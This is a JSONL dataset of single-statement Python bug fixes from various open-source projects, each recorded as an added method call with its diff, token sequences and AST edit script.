{"project": "prophetess-netbox", "commit_sha": "aa05d2c8d3446d957c3eb4d7e78d3a74a4a5ff26", "parent_sha": "de80584993d239615e74dbf757ab4083482cfa3a", "file_path": "prophetess_netbox/client.py", "project_url": "https://github.com/vapor-ware/prophetess-netbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class NetboxClient:\n \n     def build_model(self, endpoint, method, action):\n         \"\"\" Return the aionetbox Api method from an endpoint class \"\"\"\n-        name = '{}_{}_{}'.format(endpoint, method, action)\n+        name = '{}_{}_{}'.format(endpoint, method.replace('-', '_'), action)\n \n         try:\n             api = getattr(self.client, endpoint)\n", "before": "name = '{}_{}_{}' . format ( endpoint , method , action )", "after": "name = '{}_{}_{}' . format ( endpoint , method . replace ( '-' , '_' ) , action )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 59], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 33, 3, 59], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 33, 3, 59], [\"):)\", \"T\"], 7], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:method\", 3, 44, 3, 50], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'-'\", \"T\"], 1], [\"Move\", \"N2\", [\",:,\", 3, 50, 3, 51], 2], [\"Insert\", \"N2\", [\"string:'_'\", \"T\"], 3], [\"Move\", \"N2\", [\"):)\", 3, 58, 3, 59], 4]]"}
{"project": "ScoutSuite", "commit_sha": "6c38eaf051f580c9d680342b2c37f58e0cbbd96d", "parent_sha": "e5d16af8387007db046588e6d1a0017ba226d461", "file_path": "ScoutSuite/providers/gcp/resources/iam/bindings.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ class Bindings(Resources):\n \n     async def fetch_all(self):\n         raw_bindings = await self.iam_facade.get_bindings(self.project_id, self.service_account_email)\n-        for raw_binding in raw_bindings:\n+        for raw_binding in raw_bindings.get('bindings', []):\n             binding_id, binding = self._parse_binding(raw_binding)\n             self[binding_id] = binding\n \n", "before": "for raw_binding in raw_bindings : binding_id , binding = self . _parse_binding ( raw_binding ) self [ binding_id ] = binding", "after": "for raw_binding in raw_bindings . get ( 'bindings' , [ ] ) : binding_id , binding = self . _parse_binding ( raw_binding ) self [ binding_id ] = binding", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 5, 39], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:raw_bindings\", 3, 28, 3, 40], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'bindings'\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"list\", \"N3\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 1]]"}
{"project": "casepro", "commit_sha": "2f1067b409dbb2f5cbc2cc7fb129a046a1e71ed4", "parent_sha": "5776dfc732dd0ad314510d38ec0370fb3c03c807", "file_path": "casepro/contacts/migrations/0006_migrate_filter_groups.py", "project_url": "https://github.com/Ilhasoft/casepro", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def migrate_filter_groups(apps, schema_editor):\n \n     # old filter groups are now just a visibility flag on the new group model\n     for old in old_groups:\n-        new = Group.objects.filter(uuid=old.uuid)\n+        new = Group.objects.filter(uuid=old.uuid).first()\n         if new:\n             new.is_visible = True\n             new.save(update_fields=('is_visible',))\n", "before": "new = Group . objects . filter ( uuid = old . uuid )", "after": "new = Group . objects . filter ( uuid = old . uuid ) . first ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 15, 3, 50], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 15, 3, 50], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 15, 3, 50], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:first\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "ScoutSuite", "commit_sha": "312c9a2cb4f0b7181f5c1714e17532f4d91c8b8b", "parent_sha": "03f3a08500baa122e1dd6a31ea9e1cfd0445c243", "file_path": "AWSScout2/finding_ec2.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ class Ec2Finding(Finding):\n             protocol = self.callback_args[1][1].lower()\n             port = self.callback_args[1][2]\n         else:\n-            protocol = self.callback_args[1]\n+            protocol = self.callback_args[1].lower()\n             port = self.callback_args[2]\n         if protocol in obj['protocols']:\n             for rule in obj['protocols'][protocol]['rules']:\n", "before": "else : protocol = self . callback_args [ 1 ]", "after": "else : protocol = self . callback_args [ 1 ] . lower ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 2, 9, 3, 45], [\"call\", \"N0\"], 4], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 24, 3, 45], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:lower\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "ScoutSuite", "commit_sha": "07746a3d71c8a3f4ed900c32005940636bdb7bbf", "parent_sha": "218e7be20466bd535df99f66229a141287e79815", "file_path": "AWSScout2/utils.py", "project_url": "https://github.com/agnivesh/ScoutSuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -378,7 +378,7 @@ def get_value_at(all_info, current_path, key, to_string = False):\n #\n def get_non_aws_id(name):\n     m = hashlib.sha1()\n-    m.update(name)\n+    m.update(name.encode('utf-8'))\n     return m.hexdigest()\n \n \n", "before": "m . update ( name )", "after": "m . update ( name . encode ( 'utf-8' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 13, 3, 19], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 13, 3, 19], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:name\", 3, 14, 3, 18], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf-8'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 18, 3, 19], 2]]"}
{"project": "casepro", "commit_sha": "437469b58d78026e670797a04c6a3f27eccd6bf2", "parent_sha": "eacaaf14dd18d8cdfa60b7e6be5930966470e28c", "file_path": "casepro/msgs/views.py", "project_url": "https://github.com/Ilhasoft/casepro", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -495,7 +495,7 @@ class OutgoingCRUDL(SmartCRUDL):\n             page = int(self.request.GET.get(\"page\", 1))\n \n             search = self.derive_search()\n-            items = Outgoing.search_replies(org, user, search)\n+            items = Outgoing.search_replies(org, user, search).exclude(reply_to=None)\n \n             paginator = LazyPaginator(items, 50)\n             outgoing = paginator.page(page)\n", "before": "items = Outgoing . search_replies ( org , user , search )", "after": "items = Outgoing . search_replies ( org , user , search ) . exclude ( reply_to = None )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 63], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 63], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 63], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:exclude\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"keyword_argument\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:reply_to\", \"T\"], 0], [\"Insert\", \"N2\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N2\", [\"none:None\", \"T\"], 2]]"}
{"project": "atari-irl-v2", "commit_sha": "029c60e6ee802c2847d0470db1938ab698b837c0", "parent_sha": "eef66ef16968bc7adc3f4ec90e9a17d18e5eabc2", "file_path": "atari_irl/headers.py", "project_url": "https://github.com/atucker/atari-irl-v2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -202,7 +202,7 @@ class Buffer(Generic[T]):\n \n     def _reset_shuffle(self):\n         self.sample_idx = 0\n-        self.shuffle = np.arange(self.time_shape.size)\n+        self.shuffle = np.arange(self.time_shape.size).astype(np.int64)\n         self.reshuffle()\n \n     def _handle_shuffle_edge_cases(self, batch_size):\n", "before": "self . shuffle = np . arange ( self . time_shape . size )", "after": "self . shuffle = np . arange ( self . time_shape . size ) . astype ( np . int64 )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 24, 3, 55], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 24, 3, 55], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 24, 3, 55], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:np\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:int64\", \"T\"], 2]]"}
{"project": "casepro", "commit_sha": "b19f65a818a27eee66d220e930671b908bd8ed91", "parent_sha": "d3fbbc5995526e5b87128f262f810f5a5068e2f6", "file_path": "casepro/rules/tests.py", "project_url": "https://github.com/Ilhasoft/casepro", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -184,7 +184,7 @@ class RuleTest(BaseCasesTest):\n         self.ann = self.create_contact(self.unicef, 'C-001', \"Ann\")\n \n     def test_get_all(self):\n-        rules = Rule.get_all(self.unicef)\n+        rules = Rule.get_all(self.unicef).order_by('pk')\n         self.assertEqual(len(rules), 3)\n         self.assertEqual(rules[0].get_tests(), [ContainsTest([\"aids\", \"hiv\"], Quantifier.ANY)])\n         self.assertEqual(rules[0].get_actions(), [LabelAction(self.aids)])\n", "before": "rules = Rule . get_all ( self . unicef )", "after": "rules = Rule . get_all ( self . unicef ) . order_by ( 'pk' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 17, 3, 42], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 17, 3, 42], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 17, 3, 42], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:order_by\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'pk'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "casepro", "commit_sha": "9376151cda3a8415f3a35b8712001992a0fe3e04", "parent_sha": "bcbe6cea0309f8b5037148698867431869adf808", "file_path": "casepro/profiles/views.py", "project_url": "https://github.com/Ilhasoft/casepro", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ class UserCRUDL(SmartCRUDL):\n             org = self.request.org\n             if org:\n                 # only allow access to active users attached to this org\n-                queryset = queryset.filter(Q(org_admins=org) | Q(org_editors=org) | Q(org_viewers=org))\n+                queryset = queryset.filter(Q(org_admins=org) | Q(org_editors=org) | Q(org_viewers=org)).distinct()\n \n             return queryset.filter(is_active=True)\n \n", "before": "queryset = queryset . filter ( Q ( org_admins = org ) | Q ( org_editors = org ) | Q ( org_viewers = org ) )", "after": "queryset = queryset . filter ( Q ( org_admins = org ) | Q ( org_editors = org ) | Q ( org_viewers = org ) ) . distinct ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 28, 3, 104], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 28, 3, 104], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 28, 3, 104], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:distinct\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "datasets", "commit_sha": "0d756de97af256f88f975fd06d7f9b6311014e3a", "parent_sha": "02ccf29b446caebc140943d7fbb9f7b274861470", "file_path": "tensorflow_datasets/audio/commonvoice.py", "project_url": "https://github.com/jason-zl190/datasets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ class CommonVoice(tfds.core.GeneratorBasedBuilder):\n             for row in dataset:\n                 wave = ffmpeg.encode_example(\n                     os.path.join(\n-                        audio_path, \"%s.mp3\" % row[\"path\"]))\n+                        audio_path, \"%s.mp3\" % row[\"path\"])).astype(\"float32\")\n                 yield {\n                     \"client_id\": row[\"client_id\"],\n                     \"voice\": wave,\n", "before": "wave = ffmpeg . encode_example ( os . path . join ( audio_path , \"%s.mp3\" % row [ \"path\" ] ) )", "after": "wave = ffmpeg . encode_example ( os . path . join ( audio_path , \"%s.mp3\" % row [ \"path\" ] ) ) . astype ( \"float32\" )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 1, 24, 3, 61], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 1, 24, 3, 61], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 1, 24, 3, 61], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:\\\"float32\\\"\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "plugin-VLC", "commit_sha": "c988d78a09845f7efe10896f1d08797a7d7d162c", "parent_sha": "44b9459235580a7e3a91799045285c5b63717c1f", "file_path": "__init__.py", "project_url": "https://github.com/ProjectEG/plugin-VLC", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ class MyCommand(eg.ActionBase):\n         )\r\n         \r\n     def __call__(self, text):\r\n-        self.plugin.Push(eg.ParseString(text) + \"\\r\\n\")\r\n+        self.plugin.Push(eg.ParseString(text).encode('utf-8') + \"\\r\\n\")\r\n                \r\n             \r\n     def Configure(self, text=\"marq-marquee EventGhost\"):\r\n", "before": "self . plugin . Push ( eg . ParseString ( text ) + \"\\r\\n\" )", "after": "self . plugin . Push ( eg . ParseString ( text ) . encode ( 'utf-8' ) + \"\\r\\n\" )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 26, 3, 46], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 26, 3, 46], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 26, 3, 46], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "pysrp", "commit_sha": "2b79ce1974c121b9c01f37eaaaf6a01f4929fe3d", "parent_sha": "11b001b3e5b83b161c6a331a4c47f484966fe240", "file_path": "srp/_ctsrp.py", "project_url": "https://github.com/jonasao/pysrp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -281,7 +281,7 @@ def update_hash( ctx, n ):\n def calculate_M( hash_class, N, g, I, s, A, B, K ):\n     h = hash_class()\n     h.update( HNxorg( hash_class, N, g ) )\n-    h.update( hash_class(I).digest() )\n+    h.update( hash_class(I.encode()).digest() )\n     update_hash( h, s )\n     update_hash( h, A )\n     update_hash( h, B )\n", "before": "h . update ( hash_class ( I ) . digest ( ) )", "after": "h . update ( hash_class ( I . encode ( ) ) . digest ( ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 28], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 25, 3, 28], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:I\", 3, 26, 3, 27], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"):)\", 3, 27, 3, 28], 1]]"}
{"project": "gecco", "commit_sha": "681b6e90b9956b39c3b9452af7663983d373a7a1", "parent_sha": "dfd498580a0992acbd981ab65f1282be2abf4c19", "file_path": "gecco/modules/lm.py", "project_url": "https://github.com/MeTavi/gecco", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -397,7 +397,7 @@ class ColibriLMModule(Module):\n     \n         total = sum(  distribution.values() )\n         normdist = {}\n-        for w, freq in distribution:\n+        for w, freq in distribution.items():\n             freqnorm = freq/total\n             if freqnorm >= self.threshold:\n                 normdist[w] = freqnorm\n", "before": "for w , freq in distribution : freqnorm = freq / total if freqnorm >= self . threshold : normdist [ w ] = freqnorm", "after": "for w , freq in distribution . items ( ) : freqnorm = freq / total if freqnorm >= self . threshold : normdist [ w ] = freqnorm", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"for_statement\", 3, 9, 6, 39], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:distribution\", 3, 24, 3, 36], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "oct2py", "commit_sha": "ae260efdd50724845ff74ee8494bd57d1eba17ca", "parent_sha": "2054bf974c183a3a073800afe97d1a301e51b02c", "file_path": "oct2py/utils.py", "project_url": "https://github.com/TestingCI/oct2py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ def create_file(temp_dir=None):\n     temp_file = tempfile.NamedTemporaryFile(suffix='.mat', delete=False,\r\n                                             dir=temp_dir)\r\n     temp_file.close()\r\n-    return os.path.abspath(temp_file.name)\r\n+    return os.path.abspath(temp_file.name).replace('\\\\', '/')\r\n \r\n \r\n class Oct2PyError(Exception):\r\n", "before": "return os . path . abspath ( temp_file . name )", "after": "return os . path . abspath ( temp_file . name ) . replace ( '\\\\' , '/' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 43], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 43], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 43], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'\\\\\\\\'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'/'\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "pylast", "commit_sha": "20b9bdedd2895de18945519b5e9348a2fade692a", "parent_sha": "181ad7b6c9b78b3c1522e11973359aa0d8277e9b", "file_path": "pylast.py", "project_url": "https://github.com/sergithon/pylast", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1059,7 +1059,7 @@ class _Request(object):\n             if key != \"api_sig\" and key != \"api_key\" and key != \"sk\":\n                 cache_key += key + _string(self.params[key])\n \n-        return hashlib.sha1(cache_key).hexdigest()\n+        return hashlib.sha1(cache_key.encode(\"utf-8\")).hexdigest()\n \n     def _get_cached_response(self):\n         \"\"\"Returns a file object of the cached response.\"\"\"\n", "before": "return hashlib . sha1 ( cache_key ) . hexdigest ( )", "after": "return hashlib . sha1 ( cache_key . encode ( \"utf-8\" ) ) . hexdigest ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 39], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 28, 3, 39], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:cache_key\", 3, 29, 3, 38], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"utf-8\\\"\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 38, 3, 39], 2]]"}
{"project": "vumi-go", "commit_sha": "70c5dbaed72edaa888d18f6d5dcc1a7fd83ea1f1", "parent_sha": "7517afe8f8036e4eb17016f565cee97ffcd8f72a", "file_path": "go/vumitools/middleware.py", "project_url": "https://github.com/ChrisNolan1992/vumi-go", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class OptOutMiddleware(BaseMiddleware):\n \n     @staticmethod\n     def is_optout_message(message):\n-        return message['helper_metadata'].get('optout')\n+        return message['helper_metadata'].get('optout', {}).get('optout')\n \n \n class DebitAccountMiddleware(TransportMiddleware):\n", "before": "return message [ 'helper_metadata' ] . get ( 'optout' )", "after": "return message [ 'helper_metadata' ] . get ( 'optout' , { } ) . get ( 'optout' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 16, 3, 46], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 16, 3, 46], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 16, 3, 46], [\"identifier:get\", \"T\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 46], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'optout'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"dictionary\", \"N2\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4], [\"Insert\", \"N2\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N2\", [\"}:}\", \"T\"], 1]]"}
{"project": "sympy", "commit_sha": "ed6fc02519f330bfd0181b239701d23c8dd24902", "parent_sha": "07def41705a064f7e844d1ce44c0d920a7de7cbb", "file_path": "sympy/physics/hydrogen.py", "project_url": "https://github.com/TestingCI/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ def R_nl(n, l, r, Z=1):\n     # This is an equivalent normalization coefficient, that can be found in\n     # some books. Both coefficients seem to be the same fast:\n     # C =  S(2)/n**2 * sqrt(1/a**3 * factorial(n_r) / (factorial(n+l)))\n-    return  C * r0**l * laguerre_l(n_r, 2*l+1, r0) * exp(-r0/2)\n+    return  C * r0**l * laguerre_l(n_r, 2*l+1, r0).expand() * exp(-r0/2)\n \n def E_nl(n, Z=1):\n", "before": "return C * r0 ** l * laguerre_l ( n_r , 2 * l + 1 , r0 ) * exp ( - r0 / 2 )", "after": "return C * r0 ** l * laguerre_l ( n_r , 2 * l + 1 , r0 ) . expand ( ) * exp ( - r0 / 2 )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 25, 3, 51], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 25, 3, 51], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 25, 3, 51], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:expand\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "geonode", "commit_sha": "1c7c90e840d349f094aaccb44a0113dfa29dee49", "parent_sha": "a30f3e7e8d6d4286249e158171aa58a7c0bc9957", "file_path": "geonode/api/api.py", "project_url": "https://github.com/vidyar/geonode", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class TopicCategoryResource(TypeFilteredResource):\n \n     def dehydrate_count(self, bundle):\n         count = 0\n-        resources = bundle.obj.resourcebase_set.instance_of(self.type_filter) if \\\n+        resources = bundle.obj.resourcebase_set.instance_of(self.type_filter).get_real_instances() if \\\n             self.type_filter else bundle.obj.resourcebase_set.get_real_instances()\n \n         for resource in resources:\n", "before": "resources = bundle . obj . resourcebase_set . instance_of ( self . type_filter ) if self . type_filter else bundle . obj . resourcebase_set . get_real_instances ( )", "after": "resources = bundle . obj . resourcebase_set . instance_of ( self . type_filter ) . get_real_instances ( ) if self . type_filter else bundle . obj . resourcebase_set . get_real_instances ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 78], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 78], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 78], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:get_real_instances\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "Theano", "commit_sha": "8ebaac2fe5443aaeb0270ee17bff1cd16f4be81b", "parent_sha": "a8646fdc844c330942a580059a392aec0209d3bb", "file_path": "theano/sparse/tests/test_basic.py", "project_url": "https://github.com/reference-project/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -577,7 +577,7 @@ def test_size():\n     for sparse_type in ('csc_matrix', 'csr_matrix'):\n         x = getattr(theano.sparse, sparse_type)()\n-        y = getattr(scipy.sparse, sparse_type)((5, 7))\n+        y = getattr(scipy.sparse, sparse_type)((5, 7)).astype(config.floatX)\n         get_size = theano.function([x], x.size)\n         def check():\n             assert y.size == get_size(y)\n", "before": "y = getattr ( scipy . sparse , sparse_type ) ( ( 5 , 7 ) )", "after": "y = getattr ( scipy . sparse , sparse_type ) ( ( 5 , 7 ) ) . astype ( config . floatX )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 2, 13, 2, 55], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 2, 13, 2, 55], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 2, 13, 2, 55], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:astype\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:config\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:floatX\", \"T\"], 2]]"}
